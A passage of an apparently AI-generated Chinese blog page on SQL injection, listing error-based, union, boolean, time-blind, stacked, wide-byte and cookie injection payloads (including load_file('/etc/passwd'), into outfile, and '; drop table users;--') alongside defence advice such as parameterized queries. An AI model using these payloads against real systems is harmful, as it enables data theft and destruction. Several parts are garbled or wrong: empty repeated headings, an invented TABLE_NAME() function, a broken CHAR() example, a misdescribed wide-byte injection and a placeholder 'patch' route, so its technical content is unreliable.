<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以构造如下产生错误的语句:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password <span class="operator">!=</span> <span class="string">&#x27;123&#x27;</span> <span class="keyword">AND</span> ASCII(<span class="built_in">SUBSTRING</span>(password,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span></span><br></pre></td></tr></table></figure>

<p>这里判断第一个字符的ASCII为97,如果错误,数据库会返回错误信息,可能包含密码第一个字符不符合条件。</p>
<p>然后攻击者继续构造其它产生错误的语句,逐渐获取完整密码。</p>
<p>总的来说,报错注入通过分析数据库返回的错误信息,来获取隐藏的数据。</p>
<p>防范方法主要是:</p>
<ul>
<li>隐藏数据库真实错误信息</li>
<li>只返回固定的custom错误</li>
<li>过滤所有用户输入,使用参数化查询</li>
</ul>
<p>希望为大家带来新视角!如有不确切,欢迎指正。</p>
<p>报错注入是一种利用数据库错误信息来获取数据库信息的SQL注入攻击方式。</p>
<p>常见的数据库内置函数有:</p>
<ol>
<li>VERSION():用于获取数据库的版本号。例如:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> VERSION()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>DATABASE():用于获取当前数据库名。例如:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>USER():用于获取当前用户名。例如:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>()</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>TABLE_NAME():用于获取当前操作的表名。例如:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TABLE_NAME </span><br><span class="line"><span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS</span><br><span class="line"><span class="keyword">WHERE</span> COLUMN_NAME <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以通过观察数据库返回的错误信息,判断这些函数是否存在,进而获取更多数据库信息。</p>
<p>除此之外,常用的字符串函数也可以用于报错注入,例如:</p>
<ol start="5">
<li>CHAR():用于将 ASCII 码转换为相应的字符。例如:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">CHAR</span>( hdfsgdhsjfhdgs, <span class="number">114</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">116</span> )</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>CONCAT():用于连接多个字符串。例如:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CONCAT( <span class="string">&#x27;user=&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;;pwd=&#x27;</span>, rootpassword ) </span><br><span class="line"><span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>

<p>总的来说,数据库内置函数是报错注入重要的工具,通过这些函数执行,再结合观察错误信息,攻击者就可以劫持数据库。</p>
<p>抵御报错注入的最好方式是:</p>
<ul>
<li>避免输出详细的数据库错误信息</li>
<li>及时修补数据库漏洞</li>
<li>采用参数化查询技术防止SQL注入</li>
</ul>
<h6 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h6><p>最常见的SQL报错注入payload有:</p>
<ol>
<li>获取表名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables </span></span><br></pre></td></tr></table></figure>

<p>当有表存在时会返回表名,无表返回错误。</p>
<ol start="2">
<li>获取列名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>同上,存在列返回列名,否则返回错误。</p>
<ol start="3">
<li>获取数据</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(username) from users</span></span><br></pre></td></tr></table></figure>

<p>返回表内所有username。</p>
<ol start="4">
<li>执行操作语句</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,&#x27;</span><span class="operator">&lt;</span><span class="keyword">sql</span>操作语句<span class="operator">&gt;</span><span class="string">&#x27;,3  </span></span><br></pre></td></tr></table></figure>

<p>当操作合法时数据库正常,错误时返回错误信息</p>
<ol start="5">
<li>利用 time 语句延迟响应</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,if(1&gt;2,sleep(5),null)  </span></span><br></pre></td></tr></table></figure>

<p>正确查询快,错误则耗时5秒。</p>
<ol start="6">
<li>使用 INTO OUTFILE 写文件</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,(&#x27;</span><span class="operator">&lt;</span><span class="keyword">sql</span>语句<span class="operator">&gt;</span><span class="string">&#x27;) into outfile &#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span>xx.sql<span class="string">&#x27; </span></span><br></pre></td></tr></table></figure>

<p>写入文件语句,错误时返回错误信息。</p>
<ol start="7">
<li>使用 LOAD_FILE 读取文件</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,load_file(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;) </span></span><br></pre></td></tr></table></figure>

<p>读取文件内容,错误时返回错误。</p>
<ol start="8">
<li>利用通配符爆破列名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,column1 from users where column1 like &#x27;</span>a<span class="operator">%</span><span class="string">&#x27;  </span></span><br></pre></td></tr></table></figure>

<p>逐个猜测,正确则返回列名,错误则继续下一轮。</p>
<p>…</p>
<p>总的来说,报错注入payload主要利用数据库在处理特殊语句时返回的错误信息,分析并构造更多语句获取数据库中利益的数据。</p>
<p>防御报错注入的方法是:隐藏真实错误信息,只返回自定义错误,以及过滤所有用户输入。</p>
</li>
<li><h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5></li>
<li><h5 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h5></li>
<li><h5 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h5></li>
<li><h5 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h5></li>
<li><h5 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h5></li>
<li><h5 id=""><a href="#" class="headerlink" title=""></a></h5></li>
</ol>
<h4 id="二、检测"><a href="#二、检测" class="headerlink" title="二、检测"></a>二、检测</h4><p>常见的SQL注入漏洞检测PAYLOAD有:</p>
<ol>
<li><h5 id="字符注入-1"><a href="#字符注入-1" class="headerlink" title="字符注入:"></a>字符注入:</h5></li>
</ol>
<ul>
<li>‘ 或者 “</li>
<li>‘ or ‘1’&#x3D;’1</li>
<li>a’or’a’like&#x3D;a’</li>
<li>‘ or 1&#x3D;1 –</li>
<li>union select 1,2,3</li>
</ul>
<ol start="2">
<li><h5 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入:"></a>联合查询注入:</h5></li>
</ol>
<ul>
<li>union select 1,2,3</li>
<li>union select table_name from information_schema.tables  </li>
<li>union select column_name from information_schema.columns</li>
</ul>
<ol start="3">
<li><h5 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入:"></a>布尔型注入:</h5></li>
</ol>
<ul>
<li>and 1&#x3D;1</li>
<li>or 1&#x3D;1</li>
<li>&amp;&amp; 1&#x3D;&#x3D;1</li>
</ul>
<ol start="4">
<li><h5 id="错误注入"><a href="#错误注入" class="headerlink" title="错误注入:"></a>错误注入:</h5></li>
</ol>
<ul>
<li>select * from table mame where id&#x3D;’ 触发语法错误</li>
</ul>
<ol start="5">
<li><h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注:"></a>时间盲注:</h5></li>
</ol>
<ul>
<li>and sleep(5) </li>
<li>and benchmark(1000000,MD5(“password”))</li>
</ul>
<ol start="6">
<li><h5 id="报表注入"><a href="#报表注入" class="headerlink" title="报表注入:"></a>报表注入:</h5></li>
</ol>
<p>针对数据库报表服务进行注入。</p>
<ol start="7">
<li><h5 id="函数注入"><a href="#函数注入" class="headerlink" title="函数注入:"></a>函数注入:</h5></li>
</ol>
<p> exploiting flaws in database functions</p>
<ol start="8">
<li><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入:"></a>堆叠注入:</h5></li>
</ol>
<p>在一个SQL语句中注入多个SQL语句,当服务器执行这个SQL语句时,将会连续执行这多个SQL语句。</p>
<ol start="9">
<li><h5 id="函数注入-1"><a href="#函数注入-1" class="headerlink" title="函数注入:"></a>函数注入:</h5></li>
</ol>
<p> exploiting flaws in database functions</p>
<ol start="10">
<li><h5 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入:"></a>宽字节注入:</h5></li>
<li><p>给出一些常见的宽字节注入payload:</p>
<ol>
<li>单引号:\u0027</li>
<li>双引号:\u0022 </li>
<li>百分号:% </li>
<li>And 关键字: \u0026</li>
<li>Or 关键字: \u007C</li>
<li>ASCII码转换:\u0028 \u0041\u0029</li>
</ol>
<p>举个例子,一个简单的payload可以是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0027\u007C\u0031\u003D\u0031</span><br></pre></td></tr></table></figure>

<p>解码后的ASCII为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1</span><br></pre></td></tr></table></figure>

<p>等价于常规SQL注入payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1</span><br></pre></td></tr></table></figure>

<p>更高级的payload可以是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0027\u007C\u0031\u003D\u0031#\u002D\u002D</span><br></pre></td></tr></table></figure>

<p>解码为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1#--</span><br></pre></td></tr></table></figure>

<p>等价于:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|1=1#--</span><br></pre></td></tr></table></figure>

<p>这些payload可以作为宽字节注入的基本模板,然后结合具体的网站测试。</p>
<p>一般的测试步骤是:</p>
<ol>
<li>普通的SQL注入兼容测试</li>
<li>使用\u002E 测试多个数据库</li>
<li>使用\u005B\u0031\u005D 测试表</li>
<li>使用\u0028\u0031 迭代测试字段</li>
<li>使用\u0028\u0043\u0048\u0041\u0052\u0028 字符串连接来获取数据</li>
</ol>
<p>以此类推,测试不同的数据库函数来搜集数据库信息。</p>
<p>希望这些例子能为你测试宽字节注入提供参考!</p>
</li>
<li></li>
<li></li>
<li></li>
</ol>
<p>这些PAYLOAD主要从以下几个方面检测SQL注入:</p>
<ol>
<li><p>对于简单注入检测,使用字符注入PAYLOAD即可。 </p>
</li>
<li><p>联合查询PAYLOAD可以试探数据库表名和字段名。</p>
</li>
<li><p>布尔PAYLOAD可以确定数据库版本。</p>
</li>
<li><p>时间盲注可以逐渐收集数据。</p>
</li>
<li><p>错误注入可以查看报错信息。</p>
</li>
</ol>
<p>总的来说,注入PAYLOAD的形式多种多样,从简单到复杂应有尽有。常见的PAYLOAD主要利用SQL语句中的逻辑漏洞进行检测。</p>
<p>当然,在没有授权的情况下,不要随意对第三方系统进行SQL注入测试。</p>
<h5 id="防御布尔注入"><a href="#防御布尔注入" class="headerlink" title="防御布尔注入"></a>防御布尔注入</h5><p>是一种SQL注入攻击,攻击者通过构造条件表达式来获取敏感信息。</p>
<p>防范布尔注入主要有以下几个方法:</p>
<ol>
<li>对所有用户输入进行严格的过滤和清理。</li>
</ol>
<p>• 删除关键字如and、or 、&#x3D;、&gt; 等<br>• 只保留数字、字母和部分符号</p>
<ol start="2">
<li>使用参数化查询或 prepared statements。</li>
</ol>
<p>• 绑定参数,而不是将用户输入直接嵌入 SQL 语句中<br>• 避免使用拼接的方式构造 SQL 语句</p>
<ol start="3">
<li>对于高危输入,限制允许的数据类型。</li>
</ol>
<p>• 只允许数字类型的输入,避免字符串<br>• 对字符串输入限制最大长度</p>
<ol start="4">
<li>注意SQL中使用的函数。</li>
</ol>
<p>• 一些数据库函数存在安全漏洞,可以利用<br>• 避免在where条件中使用逻辑函数</p>
<ol start="5">
<li>限制error messages。</li>
</ol>
<p>• 避免将详细的错误信息返回给用户<br>• 对于SQL语句相关的错误进行隐藏</p>
<ol start="6">
<li>禁用非必需的SQL功能。</li>
</ol>
<p>• 对可能存在安全漏洞的功能如存储过程等进行限制</p>
<ol start="7">
<li>及时修复任何已知的SQL注入漏洞。</li>
</ol>
<p>防范布尔注入需要全方位的方式:<br>• 应用程序需要严格验证所有输入<br>• 数据库参数需要使用安全方式<br>• 及时检测和修复存在的漏洞</p>
<p>总的来说,通过合理的用户输入过滤、参数化查询以及错误信息减少,能有效阻止大部分布尔注入攻击。</p>
<p>希望这些防范方法能为你提供参考!如有疑问,欢迎随时提问。</p>
<h5 id="防范SQL联合查询注入"><a href="#防范SQL联合查询注入" class="headerlink" title="防范SQL联合查询注入"></a>防范SQL联合查询注入</h5><p>主要有以下几个方法:</p>
<ol>
<li>对所有用户输入进行严格的过滤和清理。</li>
</ol>
<p>特别是删除union关键字以及其它关键SQL词语。</p>
<ol start="2">
<li>使用参数化查询或 Prepared Statements。</li>
</ol>
<p>不要将用户输入直接嵌入 SQL 语句中,而是使用参数。</p>
<ol start="3">
<li>对列数和数据类型进行限制。</li>
</ol>
<p>指定用户可查询的字段个数和类型,避免非法字段。</p>
<ol start="4">
<li>适当增加查询时间。</li>
</ol>
<p>使联合查询语句执行时间超过用户可接受的限度。</p>
<ol start="5">
<li>禁用非必需的SQL功能。</li>
</ol>
<p>如可,可禁用union queries等高级SQL功能。</p>
<ol start="6">
<li>限制 error messages。</li>
</ol>
<p>避免将详细的SQL错误返回给用户。</p>
<ol start="7">
<li>及时修复任何已知的SQL注入漏洞。</li>
</ol>
<p>综上,防范SQL注入联合查询需要:</p>
<p>✔︎ 对所有用户输入进行严格的过滤和验证</p>
<p>✔︎ 使用参数化查询,绑定参数,避免SQL拼接</p>
<p>✔︎ 限制客户端可查询的字段和结果列数</p>
<p>✔︎ 隐藏错误细节,不返回有用的信息</p>
<p>✔︎ 通过安全编码和配置优化系统安全性</p>
<p>✔︎ 及时测试和修复已知的联合查询漏洞</p>
<p>主要是通过两方面来实现:</p>
<ol>
<li><p>应用层做严格的输入验证、清理和安全编码</p>
</li>
<li><p>数据库层增加限制,减少攻击面</p>
</li>
</ol>
<p>当然,采取多重防御机制效果会更佳。</p>
<p>希望这些方法可以帮助你更好地防范联合查询注入攻击。如有任何疑问,欢迎随时提问。</p>
<h5 id="防御时间盲注"><a href="#防御时间盲注" class="headerlink" title="防御时间盲注"></a>防御时间盲注</h5><p>主要的方法是:</p>
<ol>
<li>对查询参数进行严格的过滤和验证</li>
</ol>
<p>要清除所有数据库关键字和特殊字符,只允许数字、字母和有限字符。</p>
<ol start="2">
<li>使用参数化查询语句,绑定查询参数</li>
</ol>
<p>避免在SQL语句中直接使用非白名单字符,确保参数安全。</p>
<ol start="3">
<li>为每个SQL查询设置执行时间限制</li>
</ol>
<p>一旦超过阈值,则放弃执行该查询,减慢时间盲注攻击速度。</p>
<ol start="4">
<li>通过数据库配置限制结果集和返回记录</li>
</ol>
<p>设置合理的限制,阻止攻击者逐步提取大量记录。</p>
<ol start="5">
<li>关闭不必要的数据库功能</li>
</ol>
<p>如延迟函数、存储过程等,如果可操作的话。</p>
<ol start="6">
<li>及时修复数据库和应用程序的安全漏洞</li>
</ol>
<p>包括已知的时间盲注漏洞。</p>
<p>具体来说:</p>
<ul>
<li>对函数benchmark()或sleep()等进行限制。</li>
<li>配置更短的超时时间,减慢时间盲注速度。</li>
<li>通过参数化查询的方式,确保参数安全。</li>
<li>及时修复time_stamp()函数等存在漏洞的函数。</li>
</ul>
<p>总的来说,要有效防范时间盲注,需要:</p>
<p>✅ 严格过滤所有查询输入<br>✅ 使用参数化查询绑定查询参数<br>✅ 设置每个查询的执行时间限制<br>✅ 通过数据库配置限制查询结果条目<br>✅ 关闭不必要的数据库功能<br>✅ 及时修复数据库和应用程序的漏洞</p>
<p>从应用程序安全编码开始,到数据库安全配置,再到系统安全周期管理,需要全方位的防御手段共同协作,才能最大限度抵御时间盲注攻击。</p>
<p>希望这能为你提供如何防范时间盲注的参考。如果仍有疑问,欢迎继续提问。</p>
<p>参数化查询(Parameterized Query)是一种SQL注入的最佳防御方法。</p>
<p>它的工作原理是:</p>
<p>• 不直接将用户的输入嵌入到SQL语句中</p>
<p>• 而是将用户输入作为参数,使用参数名在SQL语句中引用</p>
<p>• 在执行SQL前,数据库会对这些参数进行校验和清理</p>
<p>这样的好处是:</p>
<p>• 避免了用户输入的特殊SQL字符会破坏SQL语句的语法</p>
<p>• 数据库能有效识别和清理恶意输入</p>
<p>• 用户输入在SQL语句中被视为安全的参数,而非语法的一部分</p>
<p>参数化查询的SQL语句示例:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String query <span class="operator">=</span> &quot;select * from users where name = ?&quot;;</span><br><span class="line">PreparedStatement stmt <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userInput);</span><br><span class="line">ResultSet rs <span class="operator">=</span> stmt.executeQuery();</span><br></pre></td></tr></table></figure>

<p>这里使用?作为参数占位符,在执行SQL前使用setString()方法将用户输入绑定到参数1上。</p>
<p>而非直接在SQL语句中使用userInput:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String query <span class="operator">=</span> &quot;select * from users where name = &#x27;&quot;<span class="operator">+</span> userInput <span class="operator">+</span>&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>最后, PreparedStatement 在执行时会做效参数校验和清理。</p>
<p>总的来说,参数化查询将用户输入视为安全参数来处理,而非不安全的SQL语法。</p>
<p>这是一种安全编码最佳实践,能有效防范SQL注入攻击。</p>
<p>希望通过这个解释,能让你更好地了解参数化查询的工作原理以及其重要性。如有任何疑问,欢迎随时提问。</p>
<p>防范SQL注入需要从以下几方面做:</p>
<ol>
<li>应用层过滤 Cleansing and validation</li>
</ol>
<ul>
<li>对所有用户输入进行严格的过滤和验证</li>
<li>清除或替换SQL关键字,触发字符等</li>
<li>限制输入字段的长度和数据类型</li>
</ul>
<ol start="2">
<li>安全编码 Secure coding</li>
</ol>
<ul>
<li>使用参数化查询(Prepared Statements)绑定参数</li>
<li>避免在SQL语句中直接使用用户输入</li>
<li>对所有输出进行适当的编码,避免XSS</li>
</ul>
<ol start="3">
<li>减少错误信息 Reduce error details</li>
</ol>
<ul>
<li>不要将SQL错误详情暴露给用户</li>
<li>使用通用的错误码和提示</li>
<li>避免泄露数据库信息</li>
</ul>
<ol start="4">
<li>限制功能 Disable unused features</li>
</ol>
<ul>
<li>禁用非必需的SQL函数和存储过程</li>
<li>移除不需要的数据库功能</li>
<li>审查测试所有用到的SQL API</li>
</ul>
<ol start="5">
<li>及时修复漏洞 Patch vulnerabilities</li>
</ol>
<ul>
<li>监控应用程序和数据库以查找漏洞</li>
<li>及时修补已知的SQL注入和其他漏洞</li>
</ul>
<ol start="6">
<li>限制访问 Restrict access</li>
</ol>
<ul>
<li>对不同的用户和应用分配不同的数据库权限</li>
<li>按需限制对数据库的访问和操作</li>
</ul>
<ol start="7">
<li>采用共享 hosting 或数据库云服务</li>
</ol>
<ul>
<li>将应用程序和数据库分离部署</li>
<li>由服务提供商提供基础安全保障</li>
</ul>
<p>总的来说,有效防范SQL注入需要从多方面来实施:</p>
<p>从应用程序安全编码、输入验证开始,<br>结合数据库安全配置、权限管理等多个防线,<br>辅以及时更新补丁和监控,<br>采取多重防御来降低SQL注入的攻击面和影响。</p>
<p>希望这能为你总结SQL注入防范措施提供帮助!<br>如有需要,欢迎指出我遗漏的重要内容,共同完善。</p>
<p>每个SQL注入防御措施的实际案例如下:</p>
<p>1.应用层过滤</p>
<p>例:对用户名进行清理,仅允许字母数字下划线:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">username = re.sub(<span class="string">&#x27;[^a-zA-Z0-9_]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, username)</span><br></pre></td></tr></table></figure>

<p>2.安全编码</p>
<p>例:使用Prepared Statements绑定参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span></span><br><span class="line">cursor.execute(sql, (username,))</span><br></pre></td></tr></table></figure>

<p>3.减少错误信息 </p>
<p>例:捕获SQL错误但返回通用提示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line"><span class="keyword">except</span> pymysql.InternalError <span class="keyword">as</span> e:</span><br><span class="line">    logger.error(e)</span><br><span class="line">    flash(<span class="string">&quot;There was an error processing your request&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>4.限制功能</p>
<p>例:仅允许查询已有表,禁止使用<code>create/drop</code>语句</p>
<p>5.及时修复漏洞</p>
<p>例:发现SQL注入后立即上线补丁以修复:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/patch&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sql_injection_patch</span>():</span><br><span class="line">    <span class="comment"># patch code</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;SQL injection vulnerability patched&#x27;</span></span><br></pre></td></tr></table></figure>

<p>6.限制访问</p>
<p>例:根据用户分配只读或读写数据库权限</p>
<p>7.采用云数据库</p>
<p>例:将数据库迁移至AWS RDS,由 AWS 负责数据安全。</p>
<p>希望这些具体的实践示例可以帮你更好地理解如何实施各种SQL注入防御措施!</p>
<p>如果还有任何疑问或者需要更多细节,欢迎随时提问,我会尽量提供更多有用的参考。</p>
<p>SQL堆叠注入是SQL注入攻击的一种。</p>
<p>它的主要思想是:在一个SQL语句中注入多个SQL语句,当服务器执行这个SQL语句时,将会连续执行这多个SQL语句。</p>
<p>如下SQL语句:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>; <span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br></pre></td></tr></table></figure>

<p>它实际上是两个SQL语句:</p>
<ul>
<li><code>select * from users where id=&#39;1&#39; and name=&#39;test&#39;;</code></li>
<li><code>drop table users;</code></li>
</ul>
<p>当数据库执行这个SQL语句时,将会:</p>
<ol>
<li>执行第一个SQL语句,select查询users表</li>
<li>执行第二个SQL语句,删除users表</li>
</ol>
<p>攻击者通过这种方式,可以向正常的SQL查询语句中注入多条有恶意的SQL语句,一起让数据库执行。</p>
<p>这种堆叠注入要求数据库支持多条SQL语句的执行。</p>
<p>常用的堆叠注入方式有:</p>
<ul>
<li>使用<code>;</code> 分号 separating可执行语句</li>
<li>使用<code>&amp;&amp;</code> 逻辑和运算符</li>
</ul>
<p>如上例子所示,使用<code>;</code>分号实现堆叠。</p>
<p>而通过这种方式,攻击者可以得到以下效果:</p>
<ul>
<li>查询数据库中的数据</li>
<li>修改数据库表结构</li>
<li>删除数据库表</li>
<li>执行系统命令</li>
<li>等等</li>
</ul>
<p>总的来说,SQL堆叠注入是一种危险的SQL注入方式,需要防范。</p>
<p>希望能为您提供参考!如有更多疑问,欢迎随时和我交流。</p>
<p>SQL宽字节注入(Wide Byte Injection)是SQL注入攻击的一种。</p>
<p>宽字节注入利用的是数据库和Web应用程序不能正确处理多字节字符集的数据。</p>
<p>多字节字符集中,一个字符可能占用多个字节来表示,如中文字符就属于多字节字符集。</p>
<p>而Web应用和数据库常常只能处理ASCII单字节字符集,不能正确处理多字节字符。</p>
<p>这就为SQL宽字节注入提供了可能。</p>
<p>攻击者可以使用 multibyte characters即多字节字符来构造SQL注入攻击,包括:</p>
<ul>
<li>使用双字节(如中文)或多字节字符作为注释符,例如:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span>; <span class="comment">/* 这是注释</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用unicode编码替换常用SQL注释符和函数,比如:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span><span class="operator">%</span>u0023<span class="operator">%</span>u0020select<span class="operator">%</span>u0020<span class="operator">*</span><span class="operator">%</span>u0020from<span class="operator">%</span>u0020users <span class="comment">--&#x27;; </span></span><br></pre></td></tr></table></figure>

<p>上述语句使用%u0023代表<code>#</code>,%u0020代表空格来替换注释符<code>--</code>。</p>
<ul>
<li>使用宽字节字符替换单引号等特殊符号,来进行不受限制的注入攻击。</li>
</ul>
<p>总的来说,宽字节注入 exploits数据库和应用程序的多字节字符集处理不足,使用多字节字符来构造SQL注入。</p>
<p>防范措施主要有:</p>
<ul>
<li>始终转义&#x2F;过滤用户输入,避免直接嵌入SQL</li>
<li>使用参数化查询来避免SQL注入</li>
<li>严格验证用户输入,过滤特殊字符。</li>
</ul>
<p>希望能为您提供参考!如果仍然有其他疑问,欢迎随时和我交流。</p>
<p>cookie注入是一种Web应用安全漏洞。</p>
<p>它的原理是攻击者可以注入恶意代码到Cookie中,当Web应用读取Cookie时被执行。</p>
<p>Cookie注入主要利用的是:</p>
<ol>
<li>Web应用未对Cookie内容进行足够的过滤和验证</li>
<li>Cookie中的数据被Web应用直接嵌入到SQL语句中</li>
<li>Cookie中的数据被Web应用直接当作命令执行</li>
</ol>
<p>这些条件都可以让 Cookie 注入形成安全隐患。</p>
<p>具体攻击方式包括:</p>
<ul>
<li>SQL注入:将SQL语句注入到Cookie中,当Web应用读取Cookie的数据时,执行SQL操作</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: username=test&#x27;; drop table users;--</span><br></pre></td></tr></table></figure>

<ul>
<li>XSS攻击:将XSS脚本注入Cookie,执行XSS攻击</li>
</ul>
